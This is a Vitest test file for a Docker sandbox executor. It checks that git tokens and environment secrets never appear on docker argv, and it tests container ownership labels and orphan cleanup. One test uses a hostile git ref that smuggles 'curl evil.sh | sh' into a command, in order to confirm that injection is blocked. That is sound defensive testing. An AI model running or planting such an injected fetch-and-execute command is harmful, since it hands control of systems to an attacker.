import { EventEmitter } from "events";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

const spawnMock = vi.fn();
const execFileMock = vi.fn();

vi.mock("child_process", () => ({
  spawn: (...args: unknown[]) => spawnMock(...args),
  execFile: (...args: unknown[]) => execFileMock(...args),
}));

const { DockerExecutor, reclaimOrphanedSandboxes, SANDBOX_LABEL, SESSION_LABEL, OWNER_LABEL } =
  await import("../docker.js");
const { createExecutor } = await import("../index.js");

const TOKEN = "ghs_supersecrettoken000000000000000000";

/** A spawn() stub that completes successfully and records how it was called. */
function stubSpawn() {
  spawnMock.mockImplementation(() => {
    const child = new EventEmitter() as EventEmitter & {
      stdout: EventEmitter;
      stderr: EventEmitter;
      kill: () => void;
    };
    child.stdout = new EventEmitter();
    child.stderr = new EventEmitter();
    child.kill = () => {};
    queueMicrotask(() => child.emit("close", 0));
    return child;
  });
}

/** execFile is promisified, so it must call back node-style. */
function stubExecFile(stdout = "container123\n") {
  execFileMock.mockImplementation((_cmd: string, _args: string[], cb: unknown) => {
    (cb as (e: null, r: { stdout: string; stderr: string }) => void)(null, { stdout, stderr: "" });
  });
}

async function readyExecutor() {
  stubSpawn();
  stubExecFile();
  const executor = new DockerExecutor();
  await executor.init();
  spawnMock.mockClear();
  return executor;
}

/** Every argv array docker was invoked with. */
function spawnArgs(): string[][] {
  return spawnMock.mock.calls.map((c) => c[1] as string[]);
}

beforeEach(() => {
  spawnMock.mockReset();
  execFileMock.mockReset();
});

describe("DockerExecutor.exec env handling", () => {
  it("passes env by NAME on argv and the value only via the child environment", async () => {
    const executor = await readyExecutor();
    await executor.exec("echo hi", { env: { GIT_PASSWORD: TOKEN } });

    const [args, opts] = spawnMock.mock.calls[0] as [string, string[], { env: NodeJS.ProcessEnv }];
    void args;
    const argv = spawnMock.mock.calls[0][1] as string[];
    const options = spawnMock.mock.calls[0][2] as { env: NodeJS.ProcessEnv };

    // The name is on argv so docker knows to forward it...
    expect(argv).toContain("-e");
    expect(argv).toContain("GIT_PASSWORD");
    // ...but the value must never be, or it shows up in `ps`.
    expect(argv.join(" ")).not.toContain(TOKEN);
    expect(options.env.GIT_PASSWORD).toBe(TOKEN);
    void opts;
  });

  it("adds no -e flags when no env is supplied", async () => {
    const executor = await readyExecutor();
    await executor.exec("echo hi");
    expect(spawnMock.mock.calls[0][1] as string[]).not.toContain("-e");
  });

  it("forwards several env names", async () => {
    const executor = await readyExecutor();
    await executor.exec("echo hi", { env: { A: "1", B: "2" } });
    const argv = spawnMock.mock.calls[0][1] as string[];
    expect(argv.filter((a) => a === "-e")).toHaveLength(2);
    expect(argv).toContain("A");
    expect(argv).toContain("B");
  });
});

describe("DockerExecutor.cloneRepo", () => {
  it("never puts the token in any docker argv", async () => {
    const executor = await readyExecutor();
    await executor.cloneRepo("https://github.com/o/r.git", "/workspace/repos/o_r", {
      ref: "main",
      username: "x-access-token",
      password: TOKEN,
    });

    expect(spawnMock).toHaveBeenCalled();
    for (const argv of spawnArgs()) {
      expect(argv.join(" ")).not.toContain(TOKEN);
    }
  });

  it("keeps a hostile ref out of the command string", async () => {
    const executor = await readyExecutor();
    const ref = 'main" ; curl evil.sh | sh ; "';
    await executor.cloneRepo("u", "d", { ref, password: TOKEN });

    for (const argv of spawnArgs()) {
      expect(argv.join(" ")).not.toContain("curl evil.sh");
    }
  });

  it("writes the askpass helper and marks it executable", async () => {
    const executor = await readyExecutor();
    await executor.cloneRepo("u", "d", { password: TOKEN });
    const all = spawnArgs()
      .map((a) => a.join(" "))
      .join("\n");
    expect(all).toContain("git-askpass.sh");
    expect(all).toContain("chmod +x");
  });

  it("throws when git exits non-zero", async () => {
    const executor = await readyExecutor();
    spawnMock.mockImplementation(() => {
      const child = new EventEmitter() as EventEmitter & {
        stdout: EventEmitter;
        stderr: EventEmitter;
        kill: () => void;
      };
      child.stdout = new EventEmitter();
      child.stderr = new EventEmitter();
      child.kill = () => {};
      queueMicrotask(() => {
        child.stdout.emit("data", Buffer.from("fatal: repository not found"));
        child.emit("close", 1);
      });
      return child;
    });
    await expect(executor.cloneRepo("u", "d", { password: TOKEN })).rejects.toThrow(
      /repository not found/,
    );
  });

  it("reports native git support", async () => {
    const executor = await readyExecutor();
    expect(executor.hasNativeGit()).toBe(true);
  });
});

describe("DockerExecutor sandbox ownership labels", () => {
  it("labels the container with the sandbox marker, session and owner", async () => {
    stubSpawn();
    stubExecFile();
    const executor = new DockerExecutor({ sessionId: "session-abc", ownerId: "instance-1" });
    await executor.init();

    const runArgs = execFileMock.mock.calls.find((c) => (c[1] as string[])[0] === "run")![1] as
      | string[]
      | undefined;
    expect(runArgs).toBeDefined();
    const labels = runArgs!.filter((_, i) => runArgs![i - 1] === "--label");
    expect(labels).toEqual([
      `${SANDBOX_LABEL}=1`,
      `${SESSION_LABEL}=session-abc`,
      `${OWNER_LABEL}=instance-1`,
    ]);
  });
});

describe("reclaimOrphanedSandboxes", () => {
  /** `docker ps` stdout: one "<id> <names> <owner label>" line per container. */
  function stubPsThenRm(psStdout: string) {
    const calls: string[][] = [];
    execFileMock.mockImplementation((_cmd: string, args: string[], cb: unknown) => {
      calls.push(args);
      const stdout = args[0] === "ps" ? psStdout : "";
      (cb as (e: null, r: { stdout: string; stderr: string }) => void)(null, {
        stdout,
        stderr: "",
      });
    });
    return calls;
  }

  it("removes sandboxes owned by an earlier instance and spares the current one's", async () => {
    const calls = stubPsThenRm(
      [
        "dead1 traceroot-sandbox-1 instance-old",
        "mine1 traceroot-sandbox-2 instance-2",
        "dead2 traceroot-sandbox-3 instance-old",
        "mine2 traceroot-sandbox-4 instance-2",
      ].join("\n") + "\n",
    );

    const reclaimed = await reclaimOrphanedSandboxes("instance-2");

    expect(reclaimed).toEqual(["dead1", "dead2"]);
    const rm = calls.find((args) => args[0] === "rm")!;
    // One batched removal, not one call per container.
    expect(rm).toEqual(["rm", "-f", "dead1", "dead2"]);
    expect(calls.filter((args) => args[0] === "rm")).toHaveLength(1);
  });

  it("reclaims unlabelled sandboxes left by versions that predate the labels", async () => {
    const calls = stubPsThenRm("legacy1 traceroot-sandbox-9 \nlegacy2 traceroot-sandbox-8 \n");

    expect(await reclaimOrphanedSandboxes("instance-2")).toEqual(["legacy1", "legacy2"]);
    expect(calls.find((args) => args[0] === "rm")).toEqual(["rm", "-f", "legacy1", "legacy2"]);
  });

  it("removes nothing when every sandbox belongs to this instance", async () => {
    const calls = stubPsThenRm("mine1 traceroot-sandbox-5 instance-2\n");

    expect(await reclaimOrphanedSandboxes("instance-2")).toEqual([]);
    expect(calls.some((args) => args[0] === "rm")).toBe(false);
  });

  it("ignores a container that merely contains the prefix in its name", async () => {
    // `docker ps --filter name=` matches a substring, so someone else's
    // "my-traceroot-sandbox-notes" is listed and, carrying no owner label, would
    // read as an orphan. Force-removing a container we did not create is not an
    // acceptable cost for a sweep.
    const calls = stubPsThenRm(
      "ours1 traceroot-sandbox-1 instance-old\ntheirs my-traceroot-sandbox-notes \n",
    );

    expect(await reclaimOrphanedSandboxes("instance-2")).toEqual(["ours1"]);
    expect(calls.find((args) => args[0] === "rm")).toEqual(["rm", "-f", "ours1"]);
  });

  it("keeps a container whose second name carries the prefix", async () => {
    const calls = stubPsThenRm("multi alias,traceroot-sandbox-7 instance-old\n");

    expect(await reclaimOrphanedSandboxes("instance-2")).toEqual(["multi"]);
    expect(calls.find((args) => args[0] === "rm")).toEqual(["rm", "-f", "multi"]);
  });

  it("does not fail startup when docker is unavailable", async () => {
    execFileMock.mockImplementation((_cmd: string, _args: string[], cb: unknown) => {
      (cb as (e: Error) => void)(new Error("Cannot connect to the Docker daemon"));
    });

    await expect(reclaimOrphanedSandboxes("instance-2")).resolves.toEqual([]);
  });

  it("reports a failed removal instead of throwing at startup", async () => {
    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
    execFileMock.mockImplementation((_cmd: string, args: string[], cb: unknown) => {
      if (args[0] === "ps") {
        (cb as (e: null, r: { stdout: string; stderr: string }) => void)(null, {
          stdout: "gone traceroot-sandbox-1 instance-old\n",
          stderr: "",
        });
        return;
      }
      // Removed by someone else between the list and the remove.
      (cb as (e: Error) => void)(new Error("No such container: gone"));
    });

    await expect(reclaimOrphanedSandboxes("instance-2")).resolves.toEqual(["gone"]);
    expect(warn).toHaveBeenCalledWith(expect.stringContaining("Failed to remove"));
    warn.mockRestore();
  });
});

describe("createExecutor", () => {
  const previous = process.env.SANDBOX_PROVIDER;

  afterEach(() => {
    if (previous === undefined) delete process.env.SANDBOX_PROVIDER;
    else process.env.SANDBOX_PROVIDER = previous;
  });

  it("defaults to docker and passes the sandbox identity through", async () => {
    delete process.env.SANDBOX_PROVIDER;
    stubSpawn();
    stubExecFile();
    const executor = createExecutor({ sessionId: "s1", ownerId: "o1" });
    await executor.init();

    const runArgs = execFileMock.mock.calls.find(
      (c) => (c[1] as string[])[0] === "run",
    )![1] as string[];
    expect(runArgs).toContain(`${SESSION_LABEL}=s1`);
    expect(runArgs).toContain(`${OWNER_LABEL}=o1`);
  });

  it("rejects an unknown provider by name", () => {
    process.env.SANDBOX_PROVIDER = "not-a-provider";
    expect(() => createExecutor()).toThrow(/not-a-provider/);
  });
});
